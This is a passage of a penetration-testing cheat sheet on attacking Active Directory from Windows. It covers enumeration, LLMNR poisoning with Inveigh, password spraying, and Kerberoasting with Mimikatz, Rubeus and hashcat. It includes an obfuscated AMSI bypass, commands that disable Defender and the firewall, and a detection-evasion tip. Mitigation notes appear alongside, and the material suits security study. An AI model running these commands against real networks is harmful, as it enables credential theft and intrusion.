- [BloodHound (C# and PowerShell Collectors)](bloodhound.md).
- [SharpView (C#)](sharpview.md).
- [kerbrute](kerbrute.md).
- [Crackmapexec](crackmapexec.md).
- [enum4linux](enum4linux.md).
- net.exe.
- [powershell](powershell.md).
- [ActiveDirectory PowerShell Module](activedirectory-powershell-module.md).


#### Users

##### Kerbrute

[See kerbrute](kerbrute.md).

 It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts.


```
sudo git clone https://github.com/ropnop/kerbrute.git

# Typing make help will show us the compiling options available.
cd kerbrute
make help

# type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).
sudo make all

# The newly created dist directory will contain our compiled binaries.
ls -la dist

# Copy the file to the windows pivoting machine
scp kerbrute_windows_amd64.exe username@$ip:~/
```

```
kerbrute_windows_amd64.exe userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
# d: domain
# --dc: domain controller
# -o: output file
```

##### powershell

[See powershell](powershell.md)

```powershell
# Prints all the information about the system
systeminfo

# Prints the PC's Name
hostname

# Am I alone
qwinsta

# Display Powershell relevant Powershell version information
echo $PSVersion
echo $PSVersionTable

# Prints out the OS version and revision level
[System.Environment]::OSVersion.Version	

# Prints the patches and hotfixes applied to the host
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Displays a list of environment variables for the current session (ran from CMD-prompt)
set	

# Return environment values such as key paths, users, computer information, etc.
Get-ChildItem Env: | ft Key,Value	

# Displays the domain name to which the host belongs (ran from CMD-prompt)
echo %USERDOMAIN%	

# Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
echo %logonserver%	

#You can tell if PowerShell is running with administrator privileges (a.k.a “elevated” rights) with the following snippet:
[Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544'

# Retrieves the WindowsIdentity for the currently running user.
[Security.Principal.WindowsIdentity]::GetCurrent() 

# Access the groups property of the identity to find out what user groups the identity is a member of.
[Security.Principal.WindowsIdentity]::GetCurrent()(...).groups

# It returns true if groups contains the Well Known SID of the Administrators group (the identity will only contain it if “run as administrator” was used) and otherwise false.
[Security.Principal.WindowsIdentity]::GetCurrent() -contains "S-1-5-32-544" 

# List disabled users with LDAP
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name

```

Net commands in powershell:

```powershell
# Information about domain groups
net group /domain	

# List users with domain admin privileges
net group "Domain Admins" /domain

# List of PCs connected to the domain
net group "domain computers" /domain	

# List PC accounts of domains controllers
net group "Domain Controllers" /domain	

# User that belongs to the group
net group <domain_group_name> /domain	

# List of domain groups
net groups /domain	

# All available groups
net localgroup	

# List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
net localgroup administrators /domain	

# Information about a group (admins)
net localgroup Administrators	

# Add user to administrators
net localgroup administrators [username] /add	


# Get information about a user within the domain
net user <ACCOUNT_NAME> /domain	

# List all users of the domain
net user /domain	

# Information about the current user
net user %username%	
	
```


##### Windows Management Instrumentation (WMI)

```powershell
#Displays information about all local accounts and any domain accounts that have logged into the device
wmic useraccount list /format:list	

# Information about all local groups
wmic group list /format:list	

# Dumps information about any system accounts that are being used as service accounts.
wmic sysaccount list /format:list	
```


##### ActiveDirectory PowerShell module

[See more at ActiveDirectory PowerShell module.](activedirectory-powershell-module.md)

**Get-ADDomain**: We'll enumerate some basic information about the domain with the Get-ADDomain cmdlet.

```powershell
# This will print out helpful information like the domain SID, domain functional level, any child domains, and more.
Get-ADDomain
```

**Get-ADUser**: [More on https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps).  

```powershell
# This command gets all users in the container OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM.
Get-ADUser -Filter * -SearchBase "OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM"

# This command gets all users that have a name that ends with SvcAccount:
Get-ADUser -Filter 'Name -like "*SvcAccount"' | Format-Table Name,SamAccountName -A

# This command gets all of the properties of the user with the SAM account name ChewDavid:
Get-ADUser -Identity ChewDavid -Properties *

# This command gets the user with the name ChewDavid in the Active Directory Lightweight Directory Services (AD LDS) instance:
Get-ADUser -Filter "Name -eq 'ChewDavid'" -SearchBase "DC=AppNC" -Properties "mail" -Server lds.Fabrikam.com:50000

# This command gets all enabled user accounts in Active Directory using an LDAP filter: meaning to return all disabled accounts
Get-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)'

# search for all administrative users with the `DoesNotRequirePreAuth` attribute set, meaning that they can be ASREPRoasted:
Get-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}



# Find all administrative users with the SPN "servicePrincipalName" attribute set, meaning that they can likely be subject to a Kerberoasting attack
Get-ADUser -Filter "adminCount -eq '1'" -Properties * | where servicePrincipalName -ne $null | select SamAccountName,MemberOf,ServicePrincipalName | fl

# Another way to retrieve Service Principals
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

```

**Get-ADComputer**: 

```powershell
# Search domain computers for interesting hostnames. SQL servers are a particularly juicy target on internal assessments. The below command searches all hosts in the domain using `Get-ADComputer`, filtering on the `DNSHostName` property that contains the word `SQL`
Get-ADComputer  -Filter "DNSHostName -like 'SQL*'"
```

**Get-ADGroup**:

```powershell
# Group enumeration
Get-ADGroup -Filter * | select name

# Get detailed information about a group
Get-ADGroup -Identity "Backup Operators"

# Search for administrative groups by filtering on the `adminCount` attribute. If set to `1`, it's protected by AdminSDHolder and known as protected groups. `AdminSDHolder` is owned by the Domain Admins group. It has the privileges to change the permissions of objects in Active Directory. 
Get-ADGroup -Filter "adminCount -eq 1" | select Name
```

**Get-ADGroupMember**:

```powershell
# Returns members of a group
Get-ADGroupMember -Identity "Backup Operators"
```

**Get-ADTrust**: Verify domain trust relationships using the [Get-ADTrust](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps) cmdlet. This cmdlet will print out any trust relationships the domain has. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful  on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts. 

```powershell
Get-ADTrust -Filter *
```

##### PowerView
[See more at Powerview](powerview.md).


**Module: ActiveDirectory**

```powershell
########################
# Domain/LDAP Functions
########################

# Returns the AD object for the current (or specified) domain
Get-Domain	

# Return a list of the Domain Controllers for the specified domain
Get-DomainController	

# Returns all users or specific user objects in AD
Get-DomainUser	
# Example: 
# Get-DomainUser -Identity $username -Domain $domain | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Checks for users with the SPN attribute set
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# Returns all computers or specific computer objects in AD
Get-DomainComputer	

# Returns all groups or specific group objects in AD
Get-DomainGroup	

# Searches for all or specific OU objects in AD
Get-DomainOU

# Finds object ACLs in the domain with modification rights set to non-built in objects
Find-InterestingDomainAcl	

# Returns the members of a specific domain group
Get-DomainGroupMember	
# Example: 
# Get-DomainGroupMember -Identity "Domain Admins" -Recurse
# Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) 

# Returns a list of servers likely functioning as file servers
Get-DomainFileServer	

# Returns a list of all distributed file systems for the current (or specified) domain
Get-DomainDFSShare	


########################
# GPO Functions
########################
# Returns all GPOs or specific GPO objects in AD
Get-DomainGPO	

# Returns the default domain policy or the domain controller policy for the current domain
Get-DomainPolicy	


########################
# Computer Enumeration Functions
########################
# Enumerates local groups on the local or a remote machine
Get-NetLocalGroup

# Enumerates members of a specific local group
Get-NetLocalGroupMember	

# Returns open shares on the local (or a remote) machine
Get-NetShare	

# Returns session information for the local (or a remote) machine
Get-NetSession	

# Tests if the current user has administrative access to the local (or a remote) machine
Test-AdminAccess	
# Example: 
# Test-AdminAccess -ComputerName ACADEMY-EA-MS01


########################
# Threaded 'Meta'-Functions:
########################
# Finds machines where specific users are logged in
Find-DomainUserLocation	

# Finds reachable shares on domain machines
Find-DomainShare	

# Searches for files matching specific criteria on readable shares in the domain
Find-InterestingDomainShareFile	

# Finds machines on the local domain where the current user has local administrator access
Find-LocalAdminAccess	


########################
# Domain Trust Functions:
########################
# Returns domain trusts for the current domain or a specified domain
Get-DomainTrust	

# Returns all forest trusts for the current forest or a specified forest
Get-ForestTrust	

# Enumerates users who are in groups outside of the user's domain
Get-DomainForeignUser	

# Enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainForeignGroupMember	

# Enumerates all trusts for the current domain and any others seen.
Get-DomainTrustMapping	
```


```powershell
# Gets the ID for the current Domain (useful later for crafting Golden tickets)
Get-DomainID

# Displays policies for the Domain and accounts, including for instance LockoutBadAccounts
Get-DomainPolicy

# Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
Get-DomainSPNTicket
```


##### SharpView

[More about SharpView](sharpview.md).


Download github repo from: [https://github.com/tevora-threat/SharpView/](https://github.com/tevora-threat/SharpView/).


```powershell
# Obtain help about a command
\SharpView.exe Get-DomainUser -Help

# Get information about a given user
.\SharpView.exe Get-DomainUser -Identity $username
```


#### Credentials 

##### LLMNR/NBT-NS Poisoning with Inveigh

[See Inveigh](inveigh.md).

LLMNR & NBT-NS poisoning is possible from a Windows host as well.  Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth.

**Powershell version**: The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version (in the belowed section).

```
# Install the module
Import-Module .\Inveigh.ps1

# List parameters
(Get-Command Invoke-Inveigh).Parameters


# Start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```


**C#  version**:  Before we can use the C# version of the tool, we have to compile the executable. After that we can run:

```powershell
.\Inveigh.exe
```


Results:

```powershell
[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
[!] Failed to start HTTP listener on port 80, check IP and port usage.
[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]

```


- `[+]`  default option and enabled by default
- `[ ]`  disabled options 

**Console access:** Press ESC to enter/exit interactive console. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.

```powershell-session
# List commands
> HELP

# view unique captured hashes
>  GET NTLMV2UNIQUE

#  see which usernames we have collected.
GET NTLMV2USERNAMES
```


Mitigations:  To ensure that these spoofing attacks are not possible, we can disable LLMNR and NBT-NS.

- We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."
- NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening `Network and Sharing Center` under `Control Panel`, clicking on `Change adapter settings`, right-clicking on the adapter to view its properties, selecting `Internet Protocol Version 4 (TCP/IPv4)`, and clicking the `Properties` button, then clicking on `Advanced` and selecting the `WINS` tab and finally selecting `Disable NetBIOS over TCP/IP`.
- NBT-NS can also be disabled

	- by creating a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following: 

```powershell
regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

	- Double click on Startup, choose the PowerShell Scripts tab, and select "For this GPO, run scripts in the following order" to Run Windows PowerShell scripts first, and then click on Add and choose the script. 
	- Reboot the target system or restart the network adapter.


>To push this out to all hosts in a domain, we could create a GPO using `Group Policy Management` on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as: `\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts`
>
>Once the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.


Some detection methods: [https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) 

#### Password policy 

Some tools work for this end: `net.exe`, PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.

##### net.exe

```cmd-session
net accounts
```

##### PowerView

Blocked by Microsoft Defender. 
PowerView gave us the same output as our net accounts command, just in a different format but also revealed that password complexity is enabled (PasswordComplexity=1).

```powershell-session
import-module .\PowerView.ps1

Get-DomainPolicy
```

##### Windows Management Instrumentation (`WMI`)

```powershell
# Dumps information about any system accounts that are being used as service accounts.
wmic sysaccount list /format:list	
```

##### Powershell

[The net.exe commands](powershell.md): 

```powershell
# Information about password requirements
net accounts	

# Password and lockout policy
net accounts /domain

# Information about the current user
net user %username%	
```


#### Networks

##### Powershell

[See powershell](powershell.md).

```powershell
# Lists all known hosts stored in the arp table.
arp -a

# Prints out adapter settings for the host. We can figure out the network segment from here.
ipconfig /all	

# Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
route print

# Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
netsh advfirewall show allprofiles
```


**Evasion trick**: If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string. [The net.exe commands](powershell.md): 

```powershell
# Information about password requirements
net accounts	

# Password and lockout policy
net accounts /domain

# Information about domain groups
net group /domain	

# List users with domain admin privileges
net group "Domain Admins" /domain

# List of PCs connected to the domain
net group "domain computers" /domain	

# List PC accounts of domains controllers
net group "Domain Controllers" /domain	

# User that belongs to the group
net group <domain_group_name> /domain	

# List of domain groups
net groups /domain	

# All available groups
net localgroup	

# List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
net localgroup administrators /domain	

# Information about a group (admins)
net localgroup Administrators	

# Add user to administrators
net localgroup administrators [username] /add	

# Check current shares
net share	

# Get information about a user within the domain
net user <ACCOUNT_NAME> /domain	

# List all users of the domain
net user /domain	

# Information about the current user
net user %username%	

# Mount the share locally
net use x: \computer\share	

# Get a list of computers
net view	

# 	Shares on the domains
net view /all /domain[:domainname]

# List shares of a computer
net view \computer /ALL	

# List of PCs of the domain
net view /domain	
```


#### Security controls 

cmd

```cmd
# Check if Windows Defender is running (from CMD.exe). 
sc query windefend
```

##### Powershell
[See powershell](powershell.md).

**Policies and antivirus**

```powershell
# Lists available modules loaded for use.
Get-Module	

#  print the execution policy settings for each scope on a host.
Get-ExecutionPolicy -List	

#This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
Set-ExecutionPolicy Bypass -Scope Process	
```

 [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run.

```powershell
# Enumerate AppLocker policies 
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
# If we find that a file cannot be run from a location, maybe we can try to run it from another location.

# Quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.
$ExecutionContext.SessionState.LanguageMode

# Check current execution policy. If the answer is
# - "Restricted": Ps scripts cannot run.
# - "RemoteSigned": Downloaded scripts will require the script to be signed by a trusted publisher.
Get-Execution-Policy

# Bypass execution policy
powershell -ep bypass

# Get the current Defender status.
Get-MpComputerStatus

# Deactivate antivirus from powershell session (if user has rights to do so)
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable firewall
netsh advfirewall set allprofiles state off

# Bypass AMSI
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Add a registry
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```


[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) is a powershell functions that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS). It includes finding groups specifically delegated by sysadmins, finding users with "All Extended Rights" that can view passwords, and viewing all computers with LAPS enabled. 

An account that has joined a computer to a domain receives `All Extended Rights` over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.

```powershell
# Search for computers that have LAPS enabled when passwords expire
Get-LAPSComputers

# Searches through all OUs to see which AD groups can read the ms-Mcs-AdmPwd attribute
Find-LAPSDelegatedGroups

# Searches through all OUs to see which AD groups can read the ms-Mcs-AdmPwd attribute, meaning Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups
Find-AdmPwdExtendedRights
```

See [Windows Management Instrumentation (`WMI`)](135-windows-management-instrumentation-wmi.md).

```powershell
# Prints the patch level and description of the Hotfixes applied
wmic qfe get Caption,Description,HotFixID,InstalledOn	

# Displays basic host information to include any attributes within the list
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List	

# A listing of all processes on host
wmic process list /format:list	

# Displays information about the Domain and Domain Controllers
wmic ntdomain list /format:list	

#Displays information about all local accounts and any domain accounts that have logged into the device
wmic useraccount list /format:list	

# Information about all local groups
wmic group list /format:list	

# Dumps information about any system accounts that are being used as service accounts.
wmic sysaccount list /format:list	
```


[See the net.exe commands in powershell](powershell.md):

```powershell
# Information about password requirements
net accounts	

# Password and lockout policy
net accounts /domain

# Information about domain groups
net group /domain	

# List users with domain admin privileges
net group "Domain Admins" /domain

# List of PCs connected to the domain
net group "domain computers" /domain	

# List PC accounts of domains controllers
net group "Domain Controllers" /domain	

# User that belongs to the group
net group <domain_group_name> /domain	

# List of domain groups
net groups /domain	

# All available groups
net localgroup	

# List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
net localgroup administrators /domain	

# Information about a group (admins)
net localgroup Administrators	

# Add user to administrators
net localgroup administrators [username] /add	

# Check current shares
net share	

# Get information about a user within the domain
net user <ACCOUNT_NAME> /domain	

# List all users of the domain
net user /domain	

# Information about the current user
net user %username%	

# Mount the share locally
net use x: \computer\share	

# Get a list of computers
net view	

# 	Shares on the domains
net view /all /domain[:domainname]

# List shares of a computer
net view \computer /ALL	

# List of PCs of the domain
net view /domain	
```

##### Dsquery

[Dsquery](dsquery.md) is a helpful command-line tool that can be utilized to find Active Directory objects. 

`dsquery` will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context.

```powershell
# User Search
dsquery user

# Computer Search
dsquery computer

# List objects in an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

#  List Users With Specific Attributes Set (PASSWD_NOTREQD) by Combining dsquery with LDAP search filters of our choosing. The below looks for users with the PASSWD_NOTREQD flag set in the userAccountControl attribute.
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Searching for Domain Controllers
 dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
# userAccountControl:1.2.840.113556.1.4.803: Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers (OIDs).
# =8192 represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like password is not required or account is locked is set. 

# Search users with UAC set to `Password Can't Change`:
dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))"

```


#### Shares

##### Snaffler

[See snaffler](snaffler.md).

Snaffler](https://github.com/SnaffCon/Snaffler) is a tool for **pentesters** and **red teamers** to help find delicious candy needles (creds mostly, but it's flexible) in a bunch of horrible boring haystacks (a massive Windows/AD environment). _Broadly speaking_ - it gets a list of Windows computers from Active Directory, then spreads out its snaffly appendages to them all to figure out which ones have file shares, and whether you can read them.



```bash
Snaffler.exe -s -d $domain -o snaffler.log -v data
# -s:  prints results to the console 
# -d: specifies the domain to search within
# -o: writes results to a logfile
# -v: verbosity level. "data" is best as it only displays results to the screen
```


### Password spraying

#### DomainPasswordSpray

[See DomainPasswordSpray](domainpasswordspray.md)

```powershell-session
Import-Module .\DomainPasswordSpray.ps1

# Authenticated in the domain:
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
# If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.

# Not authenticated in the domain:
Invoke-DomainPasswordSpray -UserList userlist.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

#### kerbrute

```
./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1
```

#### crackmapexec

```powershell
# Spraying password with crackmapexec
crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
# -H: hash
```


#### Mitigation techniques against password spraying

- Multi-factor Authentication	
- Restricting Access
- Reducing Impact of Successful Exploitation
- Password Hygiene

In the Domain Controller’s security log, many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.


### Privileges escalation 

#### Kerberoasting 

[See about Kerberos authentication](kerberos-authentication.md).

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments.

Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Overall:

- RC4 (type 23) encryption: TGS  hashes that begin with `$krb5tgs$23$*`
- AES-256 (type 18) encryption: TGS  hashes that begin with `$krb5tgs$18$*`

###### setspn.exe

**1.** Enumerating SPNs with setspn.exe

```cmd-session
setspn.exe -Q */*
```

We will focus on `user accounts` and ignore the computer accounts returned by the tool.

**2.** Using PowerShell, we can request TGS tickets for the interested account and load them into memory.

```powershell
Add-Type -AssemblyName System.IdentityModel
# Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object.
# -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
# System.IdentityModel is a namespace that contains different classes for building security token services

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
#  New-Object cmdlet to create an instance of a .NET Framework object.
# System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token 
# -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433": pass the SPN name to the class to request a Kerberos TGS ticket
```


**3.** If needed, we could also retrieve all tickets:

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```


**4.** Extract Tickets from Memory with Mimikatz

```cmd-session
# Launch mimikatz
mimikatz.exe

# Specify base64
base64 /out:true
# If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files.

# Export the tickets
kerberos::list /export 
```

**5.** Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

```shell-session
echo "<base64 blob>" |  tr -d \\n 
```


**6.** We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

```shell-session
cat encoded_file | base64 -d > sqldev.kirbi
```

**7.** Use [kirbi2john.py](kirbi2john.md):


```shell-session
python2.7 kirbi2john.py Filename.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > ServiceName_tgs_hashcat
```

**8.** Cracking the Hash with Hashcat

```shell-session
hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.

###### PowerView

Let's use PowerView to extract the TGS tickets and convert them to Hashcat format. 

**1.** Enumerating SPNs with PowerView:

```powershell
# Import module
Import-Module .\PowerView.ps1

# List SPNs: Option 1
Get-DomainUser * -spn | select samaccountname

# List SPNs: Option 2
Get-NetUser -SPN
```

**2.** Generate a TGS ticker for a specific user:

```powershell
# Option 1
Get-DomainUser -Identity $samAccountName | Get-DomainSPNTicket -Format Hashcat

# Option 2
Get-DomainSPNTicket -SPN $samAccountName -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt
```

**3.** Or obtain all SPN TGS tickets and export them to a CSV

```powershell-session
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\FileName.csv -NoTypeInformation
```


###### Rubeus

[See more about Rubeus](rubeus.md).

Gather stats:

```powershell
 \Rubeus.exe kerberoast /stats
```

Request tickets with admincount attribute set to 1:

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
# /nowrap flag: so that the hash can be more easily copied down for offline cracking using Hashcat. The ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped.
```

 Perform Kerberoasting on a user testspn:
 
```powershell
# Perform Kerberoasting on a user testspn
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

If the received TGS ticket is RC4 (type 23) encrypted, it will be easier to crack. We can check out if the user hast the `msDS-SupportedEncryptionTypes` attribute is set to `0`.  The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.

```powershell
# Check the encryption of the TGS ticket for user testspn
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes


#serviceprincipalname       msds-supportedencryptiontypes samaccountname
# ----------                 ----------------------------- --------------
# testspn/kerberoast.inlanefreight.local               0   testspn
```

With RC4 (type 23) encryption, this would be the hashcat module:

```shell-session
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

The results for the AES-256 (type 18) encryption would be `24`:

```powershell
# Check the encryption of the TGS ticket for user testspn
